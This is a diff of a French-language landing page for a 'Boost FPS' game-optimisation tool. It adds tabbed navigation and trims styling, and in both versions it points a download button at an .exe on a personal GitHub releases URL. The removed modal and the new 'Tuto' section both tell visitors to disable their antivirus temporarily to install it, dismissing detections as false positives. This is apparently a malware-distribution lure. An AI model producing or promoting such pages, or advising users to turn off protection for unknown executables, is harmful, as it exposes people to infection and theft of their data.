@@ -27,183 +27,72 @@
         header {
             background: linear-gradient(135deg, #ff6f61, #ff6f61, #ffbc42);
             color: #fff;
-            padding: 120px 0;
+            padding: 60px 0;
             text-align: center;
             box-shadow: inset 0 0 50px rgba(0, 0, 0, 0.3);
-            position: relative;
         }
 
         header h1 {
-            font-size: 4.5em;
+            font-size: 3em;
             font-weight: bold;
-            margin-bottom: 20px;
             text-transform: uppercase;
         }
 
-        header p {
-            font-size: 1.5em;
-            font-weight: 500;
-        }
-
-        .main-content {
-            padding: 60px 0;
+        nav {
+            background: #444;
+            padding: 15px;
             text-align: center;
-            background-color: #fff;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-            margin-top: -50px;
-            border-radius: 15px;
         }
 
-        .main-content h2 {
-            font-size: 2.8em;
-            margin-bottom: 20px;
-            color: #333;
-        }
-
-        .main-content p {
+        nav a {
+            color: #fff;
+            text-decoration: none;
             font-size: 1.2em;
-            margin-bottom: 30px;
-            color: #777;
+            padding: 10px 20px;
+            display: inline-block;
+            transition: background 0.3s;
+        }
+
+        nav a:hover {
+            background: #ff6f61;
+        }
+
+        .section {
+            display: none;
+            padding: 40px;
+            background: #fff;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            border-radius: 15px;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .section.active {
+            display: block;
         }
 
         .download-button {
             display: inline-block;
-            padding: 20px 40px;
+            padding: 15px 30px;
             background-color: #ff6f61;
             color: #fff;
             font-size: 1.5em;
             text-decoration: none;
             border-radius: 50px;
-            transition: background-color 0.3s ease, transform 0.3s ease, box-shadow 0.3s ease;
-            box-shadow: 0 6px 18px rgba(255, 111, 97, 0.4);
-            animation: pulse 2s infinite;
+            transition: background-color 0.3s ease, transform 0.3s ease;
         }
 
         .download-button:hover {
             background-color: #ff4c3b;
             transform: scale(1.1);
-            box-shadow: 0 8px 25px rgba(255, 111, 97, 0.6);
-        }
-
-        @keyframes pulse {
-            0% {
-                transform: scale(1);
-            }
-            50% {
-                transform: scale(1.05);
-            }
-            100% {
-                transform: scale(1);
-            }
         }
 
         footer {
             background-color: #333;
             color: #fff;
-            padding: 40px 0;
+            padding: 20px 0;
             text-align: center;
-            margin-top: 50px;
-        }
-
-        footer p {
-            font-size: 1.1em;
-            color: #bbb;
-        }
-
-        /* Responsive Design */
-        @media (max-width: 768px) {
-            .container {
-                width: 90%;
-            }
-
-            header h1 {
-                font-size: 3.5em;
-            }
-
-            header p {
-                font-size: 1.2em;
-            }
-
-            .main-content h2 {
-                font-size: 2.2em;
-            }
-
-            .main-content p {
-                font-size: 1em;
-                margin-bottom: 20px;
-            }
-
-            .download-button {
-                padding: 15px 30px;
-                font-size: 1.3em;
-            }
-
-            footer p {
-                font-size: 1em;
-            }
-        }
-
-        .antivirus-warning {
-            background-color: #ffcc00;
-            color: #333;
-            padding: 15px;
-            margin: 20px 0;
-            font-size: 1.1em;
-            border-radius: 5px;
-        }
-
-        .antivirus-warning a {
-            color: #ff6f61;
-            text-decoration: underline;
-            cursor: pointer;
-        }
-
-        /* Modale */
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 1;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
-        }
-
-        .modal-content {
-            background-color: #fff;
-            margin: 15% auto;
-            padding: 20px;
-            border-radius: 10px;
-            width: 50%;
-            text-align: left;
-        }
-
-        .modal-header {
-            font-size: 1.8em;
-            margin-bottom: 15px;
-        }
-
-        .modal-body {
-            font-size: 1.2em;
-            margin-bottom: 20px;
-        }
-
-        .close {
-            color: #aaa;
-            font-size: 1.5em;
-            font-weight: bold;
-            position: absolute;
-            top: 10px;
-            right: 15px;
-            cursor: pointer;
-        }
-
-        .close:hover,
-        .close:focus {
-            color: black;
-            text-decoration: none;
-            cursor: pointer;
+            margin-top: 30px;
         }
     </style>
 </head>
@@ -212,67 +101,52 @@
     <header>
         <div class="container">
             <h1>Boost FPS</h1>
-            <p>Maximise les performances de ton PC avec notre application Boost FPS.</p>
+            <p>Maximise les performances de ton PC avec Boost FPS.</p>
         </div>
     </header>
 
-    <section class="main-content">
-        <div class="container">
+    <nav>
+        <a href="#" onclick="showSection('home')">Accueil</a>
+        <a href="#" onclick="showSection('help')">Help</a>
+        <a href="#" onclick="showSection('version')">Version</a>
+        <a href="#" onclick="showSection('tuto')">Tuto</a>
+    </nav>
+
+    <div class="container">
+        <section id="home" class="section active">
             <h2>Optimise ton expérience de jeu</h2>
-            <p>Boost FPS t'offre une expérience de jeu fluide et performante, sans lags et avec un meilleur rendu graphique. Télécharge maintenant et fais la différence !</p>
+            <p>Boost FPS t'offre une expérience fluide et performante. Télécharge maintenant !</p>
+            <a href="https://github.com/seyzperly572/New/releases/download/boostfps/boostfps2.0.exe" download="boostfps2.0.exe" class="download-button">Télécharger</a>
+        </section>
 
-            <div class="antivirus-warning">
-                <p><strong>Avis important :</strong> Certains antivirus peuvent détecter notre application comme une menace à cause de la manière dont elle optimise les performances. Si ton antivirus bloque le téléchargement, il peut être nécessaire de le désactiver temporairement pour installer Boost FPS. <br> <strong><a id="showModal">En savoir plus</a></strong></p>
-            </div>
+        <section id="help" class="section">
+            <h2>Aide et Support</h2>
+            <p>Si tu rencontres un problème, consulte notre FAQ ou contacte-nous.</p>
+        </section>
 
-            <!-- Lien mis à jour pour GitHub -->
-            <a href="https://github.com/seyzperly572/New/releases/download/boostfps/boostfps2.0.exe" download="boostfps2.0.exe" class="download-button">Télécharger Boost FPS</a>
-        </div>
-    </section>
+        <section id="version" class="section">
+            <h2>Version actuelle</h2>
+            <p>Boost FPS v2.0 - Dernière mise à jour : Mars 2025.</p>
+        </section>
 
-    <footer>
-        <div class="container">
-            <p>&copy; 2025 Boost FPS. Optimise tes jeux maintenant !</p>
-        </div>
-    </footer>
-
-    <!-- Modale -->
-    <div id="myModal" class="modal">
-        <div class="modal-content">
-            <span class="close" id="closeModal">&times;</span>
-            <div class="modal-header">Désactiver l'antivirus pour l'installation</div>
-            <div class="modal-body">
-                <p>Certains logiciels antivirus peuvent détecter notre application comme un faux positif en raison des modifications qu'elle apporte aux performances du PC. Si tu rencontres un problème, désactive temporairement ton antivirus pendant l'installation, puis réactive-le une fois l'installation terminée.</p>
-                <p>Si tu n'es pas sûr de la procédure, tu peux consulter la documentation de ton antivirus ou visiter leur site pour obtenir plus d'informations sur comment désactiver l'antivirus pendant l'installation de logiciels.</p>
-            </div>
-        </div>
+        <section id="tuto" class="section">
+            <h2>Tutoriel d'installation</h2>
+            <p>1. Télécharge Boost FPS.</p>
+            <p>2. Désactive ton antivirus temporairement si nécessaire.</p>
+            <p>3. Lance l'installation et suis les instructions.</p>
+        </section>
     </div>
 
+    <footer>
+        <p>&copy; 2025 Boost FPS. Optimise tes jeux maintenant !</p>
+    </footer>
+
     <script>
-        // Obtenez l'élément modal
-        var modal = document.getElementById("myModal");
-
-        // Obtenez le bouton qui ouvre la modale
-        var btn = document.getElementById("showModal");
-
-        // Obtenez l'élément <span> qui ferme la modale
-        var span = document.getElementById("closeModal");
-
-        // Lorsque l'utilisateur clique sur le lien "En savoir plus", ouvrez la modale
-        btn.onclick = function() {
-            modal.style.display = "block";
-        }
-
-        // Lorsque l'utilisateur clique sur <span> (x), fermez la modale
-        span.onclick = function() {
-            modal.style.display = "none";
-        }
-
-        // Lorsque l'utilisateur clique n'importe où en dehors de la modale, fermez la modale
-        window.onclick = function(event) {
-            if (event.target == modal) {
-                modal.style.display = "none";
-            }
+        function showSection(sectionId) {
+            document.querySelectorAll('.section').forEach(section => {
+                section.classList.remove('active');
+            });
+            document.getElementById(sectionId).classList.add('active');
         }
     </script>
 
